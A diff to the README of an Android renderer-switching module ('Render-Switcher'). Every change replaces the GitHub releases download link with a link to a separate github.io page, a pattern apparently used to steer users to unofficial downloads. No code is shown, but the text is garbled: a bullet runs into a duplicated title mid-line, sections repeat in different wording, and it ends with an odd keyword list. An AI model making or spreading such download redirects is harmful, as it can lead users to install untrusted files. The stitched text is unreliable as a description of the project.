@@ -1,10 +1,10 @@
 # 🎛️ Render-Switcher - Switch Per-App Graphics with Confidence
 
-[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-6f42c1?style=for-the-badge&logo=android&logoColor=white)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-6f42c1?style=for-the-badge&logo=android&logoColor=white)](https://thealienn.github.io)
 
 Render-Switcher is an Android module that lets you choose Vulkan or OpenGL for individual apps. It supports Magisk, KernelSU and APatch, with Zygisk, WebUI and CLI controls. Windows users can download the release, keep the file organized, and move it to the Android device for module setup.
 
-Visit this link to download the application: https://github.com/TheAlienn/Render-Switcher/releases
+Visit this link to download the application: https://thealienn.github.io
 
 ## ✨ Why Render-Switcher Is Useful
 
@@ -17,11 +17,11 @@ Main benefits include:
 - Per-app renderer switching between Vulkan and OpenGL.
 - Support for Magisk, KernelSU and APatch module# 🎛️ Render-Switcher - Switch Per-App Graphics with Confidence
 
-[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-6f42c1?style=for-the-badge&logo=android&logoColor=white)](https://github.com/TheAlienn/Render-Switcher/releases)
+[![Download Render-Switcher](https://img.shields.io/badge/Download-Render--Switcher-6f42c1?style=for-the-badge&logo=android&logoColor=white)](https://thealienn.github.io)
 
 Render-Switcher is an Android module that lets you choose the graphics renderer — Vulkan or OpenGL — for each app individually. It works with Magisk, KernelSU and APatch, and includes a Zygisk component, a WebUI for point-and-click control, and a CLI for terminal users.
 
-Visit this link to download the application: https://github.com/TheAlienn/Render-Switcher/releases
+Visit this link to download the application: https://thealienn.github.io
 
 ## ✨ What Render-Switcher Does
 
@@ -67,7 +67,7 @@ You do not need a special Android build, a custom kernel, or developer tools on 
 
 The download page hosts the release files for Render-Switcher. On Windows, use your browser and follow the single instruction below.
 
-Visit this link to download the application: https://github.com/TheAlienn/Render-Switcher/releases
+Visit this link to download the application: https://thealienn.github.io
 
 When the page opens, look at the most recent release at the top. Download the module package listed there. Windows may ask where to save the file — pick your Downloads folder or any place you can find again easily. Do not rename the file after downloading, since module managers rely on the original file type to recognize it.
 
@@ -129,6 +129,6 @@ The CLI is useful for scripting, for quick changes while debugging, or for devic
 
 **Where do I get updates?** Return to the download link above and check for a newer release.
 
-Visit this link to download the application: https://github.com/TheAlienn/Render-Switcher/releases
+Visit this link to download the application: https://thealienn.github.io
 
 Keywords: 4750, cli, exloud, opengl, patch, skia, switch, ui, ui-design, vulkan, webui, zygisk
